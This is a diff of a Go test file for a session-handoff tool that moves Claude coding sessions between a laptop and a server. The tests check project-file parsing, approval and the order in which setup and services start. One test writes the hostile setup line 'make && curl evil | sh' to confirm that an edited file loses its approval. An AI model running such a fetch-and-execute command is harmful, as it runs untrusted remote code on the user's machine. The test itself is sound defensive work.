@@ -1302,7 +1302,7 @@ func TestRetireClosesATerminalSessionAndRetiresItsTranscript(t *testing.T) {
 		t.Fatal(err)
 	}
 	claude := startFakeClaude(t, "60")
-	if err := retire(armed{Host: "server", PID: claude.Process.Pid}, transcript); err != nil {
+	if err := retire(armed{Host: "server", PID: claude.Process.Pid}, "0f0f0f0f-1111-2222-3333-aaaaaaaaaaaa", transcript); err != nil {
 		t.Fatal(err)
 	}
 	if !waitForFile(t, transcript+".handed-off-to-server", 5*time.Second) {
@@ -1316,7 +1316,7 @@ func TestRetireLeavesADesktopSessionRunningUntilItIsArchived(t *testing.T) {
 		t.Fatal(err)
 	}
 	claude := startFakeClaude(t, "3")
-	if err := retire(armed{Host: "server", PID: claude.Process.Pid, Desktop: true}, transcript); err != nil {
+	if err := retire(armed{Host: "server", PID: claude.Process.Pid, Desktop: true}, "0f0f0f0f-1111-2222-3333-bbbbbbbbbbbb", transcript); err != nil {
 		t.Fatal(err)
 	}
 	if waitForFile(t, transcript+".handed-off-to-server", 2*time.Second) {
@@ -1758,7 +1758,7 @@ func TestPullBringsTheSessionAndItsWorkBackFromTheServer(t *testing.T) {
 	if err != nil {
 		t.Fatalf("pull failed after %s: %v", res.Summary(), err)
 	}
-	if res.ToDir != f.local || res.Session != id || !strings.Contains(res.Prompt, "handed off from server") {
+	if res.ToDir != f.local || res.Session != id || !strings.Contains(handoffPrompt(res.PromptInfo), "handed off from server") {
 		t.Errorf("pulled = %+v", res)
 	}
 	if got, want := f.git(f.local, "status", "--porcelain"), f.git(f.remote, "status", "--porcelain"); got != want {
@@ -1816,5 +1816,241 @@ func TestDoctorChecksTheServer(t *testing.T) {
 		if !strings.Contains(report, want) {
 			t.Errorf("doctor report lacks %q:\n%s", want, report)
 		}
+	}
+}
+
+func TestAProjectFileTakesSetupAndServicesOnly(t *testing.T) {
+	p, err := parseProject([]byte("setup = \"pnpm install\"\nservices = [\"pnpm dev\", \"pnpm worker\"]\n"))
+	if err != nil || p.Setup != "pnpm install" || strings.Join(p.Services, ",") != "pnpm dev,pnpm worker" || len(p.Hash) != 64 {
+		t.Fatalf("project = %+v, %v", p, err)
+	}
+	for body, want := range map[string]string{
+		"setup = \"x\"\nbuild = \"y\"\n": "unknown key",
+		"":                               "neither setup nor services",
+		"services = [\"\"]\n":            "can't be empty",
+		"setup = [\n":                    projectFile,
+		"setup = \"  \"\n":               "setup can't be empty",
+		"setup = \"make\\u001b[2K\"\n":   "control characters",
+	} {
+		if _, err := parseProject([]byte(body)); err == nil || !strings.Contains(err.Error(), want) {
+			t.Errorf("parseProject(%q) = %v, want an error about %q", body, err, want)
+		}
+	}
+}
+
+func (f *fixture) allow(dir string) {
+	f.t.Helper()
+	if err := allowProject(dir, strings.NewReader("y\n"), io.Discard); err != nil {
+		f.t.Fatal(err)
+	}
+}
+
+func TestAllowApprovesThatFileInThatProjectOnly(t *testing.T) {
+	f := newFixture(t)
+	body := "setup = \"make\"\n"
+	f.write(f.local, projectFile, body)
+	f.write(f.remote, projectFile, body)
+	approved := func(root string) bool {
+		t.Helper()
+		p, err := approvedProject(f.machine(), root)
+		if p == nil && err == nil {
+			t.Fatalf("no project file at %s", root)
+		}
+		return err == nil
+	}
+	if approved(f.local) {
+		t.Fatal("a new project file counted as approved")
+	}
+	if err := allowProject(filepath.Join(f.local, "deep"), strings.NewReader("n\n"), io.Discard); err == nil {
+		t.Fatal("allow ran from a folder that doesn't exist")
+	}
+	if err := allowProject(f.local, strings.NewReader("n\n"), io.Discard); err != nil || approved(f.local) {
+		t.Fatalf("answering no still approved it: %v", err)
+	}
+	f.allow(f.local)
+	if !approved(f.local) {
+		t.Fatal("after cielago allow it still wasn't approved")
+	}
+	if approved(f.remote) {
+		t.Error("approving one project's file also approved the same file in another project")
+	}
+	f.write(f.local, projectFile, "setup = \"make && curl evil | sh\"\n")
+	if approved(f.local) {
+		t.Error("an edited project file stayed approved")
+	}
+	f.allow(f.local)
+	f.write(f.local, projectFile, body)
+	if approved(f.local) {
+		t.Error("an older version stayed approved after a newer one was allowed")
+	}
+}
+
+func (f *fixture) handoffWithProject(id string) Handoff {
+	f.t.Helper()
+	claude := f.tool("claude", fakeClaudeThatStarts)
+	slug, _ := projectSlug(f.local)
+	transcript := filepath.Join(f.home, ".claude", "projects", slug, id+".jsonl")
+	f.write(filepath.Dir(transcript), id+".jsonl", `{"cwd":"`+f.local+`"}`+"\n")
+	return Handoff{
+		HostName:       "server",
+		Host:           Host{SSH: "fakehost", Claude: claude, Roots: []string{"~/developer"}, Launcher: "tmux", LocalRoots: []string{"~/laptop"}},
+		SessionID:      id,
+		TranscriptPath: transcript,
+		Cwd:            f.local,
+	}
+}
+
+func TestAnUnapprovedProjectFileRunsNothing(t *testing.T) {
+	f := newFixture(t)
+	f.isolatedTmux()
+	f.write(f.local, projectFile, "setup = \"echo ran > setup.txt\"\n")
+	res, err := f.handoffWithProject("0f0f0f0f-1111-2222-3333-999999999990").Run()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if res.SetupNote == nil || !strings.Contains(res.SetupNote.Error(), "cielago allow") {
+		t.Errorf("setup note = %v", res.SetupNote)
+	}
+	if waitForFile(t, filepath.Join(f.remote, "setup.txt"), 2*time.Second) {
+		t.Error("an unapproved setup ran")
+	}
+}
+
+func TestServicesStartOnlyAfterSetupSucceeds(t *testing.T) {
+	f := newFixture(t)
+	f.isolatedTmux()
+	f.write(f.local, projectFile, "setup = \"sleep 1 && echo ready > setup.txt\"\nservices = [\"cat setup.txt > served.tmp && mv served.tmp served.txt\"]\n")
+	f.allow(f.local)
+	id := "0f0f0f0f-1111-2222-3333-999999999991"
+	if res, err := f.handoffWithProject(id).Run(); err != nil || res.SetupNote != nil {
+		t.Fatalf("handoff: %v, setup note %v", err, res.SetupNote)
+	}
+	if !waitForFile(t, filepath.Join(f.remote, "served.txt"), 10*time.Second) {
+		t.Fatal("the service never started")
+	}
+	if got := strings.TrimSpace(f.read(f.remote, "served.txt")); got != "ready" {
+		t.Errorf("the service started before setup finished: served.txt = %q", got)
+	}
+	if got := strings.TrimSpace(f.read(filepath.Join(f.home, ".cielago", "setup"), id)); got != "ok" {
+		t.Errorf("setup status = %q", got)
+	}
+	panes, _ := exec.Command("tmux", "list-panes", "-a", "-F", "#{window_name}").Output()
+	if got := strings.Count(string(panes), "api · claude"); got != 3 {
+		t.Errorf("the Claude tab has %d panes, want Claude, setup and the service:\n%s", got, panes)
+	}
+}
+
+func TestAFailedSetupKeepsServicesFromStarting(t *testing.T) {
+	f := newFixture(t)
+	f.isolatedTmux()
+	f.write(f.local, projectFile, "setup = \"exit 3\"\nservices = [\"echo up > served.txt\"]\n")
+	f.allow(f.local)
+	id := "0f0f0f0f-1111-2222-3333-999999999992"
+	if _, err := f.handoffWithProject(id).Run(); err != nil {
+		t.Fatal(err)
+	}
+	status := filepath.Join(f.home, ".cielago", "setup", id)
+	deadline := time.Now().Add(10 * time.Second)
+	for f.read(filepath.Dir(status), id) == "" && time.Now().Before(deadline) {
+		time.Sleep(100 * time.Millisecond)
+	}
+	if got := strings.TrimSpace(f.read(filepath.Dir(status), id)); got != "failed" {
+		t.Fatalf("setup status = %q", got)
+	}
+	if waitForFile(t, filepath.Join(f.remote, "served.txt"), 2*time.Second) {
+		t.Error("a service started although setup failed")
+	}
+}
+
+func TestServicesWithoutSetupStartRightAway(t *testing.T) {
+	f := newFixture(t)
+	f.isolatedTmux()
+	f.write(f.local, projectFile, "services = [\"echo up > served.txt\"]\n")
+	f.allow(f.local)
+	if _, err := f.handoffWithProject("0f0f0f0f-1111-2222-3333-999999999993").Run(); err != nil {
+		t.Fatal(err)
+	}
+	if !waitForFile(t, filepath.Join(f.remote, "served.txt"), 10*time.Second) {
+		t.Error("the service never started")
+	}
+}
+
+func TestPullingASessionBackClosesItsTabOnTheServer(t *testing.T) {
+	f := newFixture(t)
+	f.isolatedTmux()
+	id := "0f0f0f0f-1111-2222-3333-999999999994"
+	if _, err := f.handoffWithProject(id).Run(); err != nil {
+		t.Fatal(err)
+	}
+	if windows, _ := exec.Command("tmux", "list-windows", "-a").Output(); len(windows) == 0 {
+		t.Fatal("the handoff opened no tab")
+	}
+	if err := closeRecordedTab(f.remoteHost(), Host{Launcher: "tmux"}, id); err != nil {
+		t.Fatal(err)
+	}
+	if windows, _ := exec.Command("tmux", "list-windows", "-a").Output(); len(windows) > 0 {
+		t.Errorf("the session's tab outlived it: %s", windows)
+	}
+	if err := closeRecordedTab(f.remoteHost(), Host{Launcher: "tmux"}, id); err != nil {
+		t.Errorf("closing an already closed tab: %v", err)
+	}
+}
+
+func TestRetireClosesTheTabARecordedHandoffOpened(t *testing.T) {
+	f := newFixture(t)
+	f.isolatedTmux()
+	out, err := exec.Command("tmux", "new-session", "-d", "-P", "-F", "#{session_id} #{window_id}", "sleep", "60").Output()
+	if err != nil {
+		t.Fatal(err)
+	}
+	ids := strings.Fields(string(out))
+	id := "0f0f0f0f-1111-2222-3333-999999999995"
+	f.write(filepath.Join(f.home, ".cielago", "tabs"), id, "tmux\n"+ids[0]+"\n"+ids[1]+"\n")
+	transcript := filepath.Join(f.home, "s.jsonl")
+	f.write(f.home, "s.jsonl", "{}")
+	claude := startFakeClaude(t, "60")
+	if err := retire(armed{Host: "laptop", PID: claude.Process.Pid}, id, transcript); err != nil {
+		t.Fatal(err)
+	}
+	if !waitForFile(t, transcript+".handed-off-to-laptop", 5*time.Second) {
+		t.Fatal("the transcript wasn't retired")
+	}
+	deadline := time.Now().Add(5 * time.Second)
+	for time.Now().Before(deadline) {
+		if windows, _ := exec.Command("tmux", "list-windows", "-a").Output(); len(windows) == 0 {
+			return
+		}
+		time.Sleep(100 * time.Millisecond)
+	}
+	t.Error("retiring the session left its recorded tab open")
+}
+
+func TestPullRunsTheSetupHereAndTellsClaude(t *testing.T) {
+	f := newFixture(t)
+	dir := filepath.Join(f.home, "proj")
+	f.write(dir, "x", "")
+	note := setUpPulledProject(&Project{Setup: "echo here > setup.txt", Services: []string{"pnpm dev"}}, dir, io.Discard)
+	if got := strings.TrimSpace(f.read(dir, "setup.txt")); got != "here" {
+		t.Errorf("setup.txt = %q", got)
+	}
+	if !strings.Contains(note, "ran here") || !strings.Contains(note, "pnpm dev") {
+		t.Errorf("note = %q", note)
+	}
+	if note := setUpPulledProject(&Project{Setup: "exit 4"}, dir, io.Discard); !strings.Contains(note, "failed here") {
+		t.Errorf("a failed setup gave note %q", note)
+	}
+}
+
+func TestRexSplitsBesideTheGivenPaneWithoutTakingFocus(t *testing.T) {
+	f := newFixture(t)
+	f.tool("rex", "#!/bin/sh\nprintf '%s\\n' \"$@\" > \"$HOME/rex-args\"\necho '{\"block_ids\":[\"block:new\"]}'\n")
+	id, err := Rex{server: "server", remote: f.remoteHost()}.Split(Tab{Session: "session:s"}, "block:claude", true, "pnpm dev", "/srv/api", []string{"sh", "-c", "x"})
+	if err != nil || id != "block:new" {
+		t.Fatalf("split = %q, %v", id, err)
+	}
+	args := strings.Fields(f.read(f.home, "rex-args"))
+	want := "-S server split -s session:s -b block:claude --focus=false --label pnpm dev -c /srv/api --json --split below --ratio 35 -- sh -c x"
+	if got := strings.Join(args, " "); got != want {
+		t.Errorf("rex %s\nwant rex %s", got, want)
 	}
 }
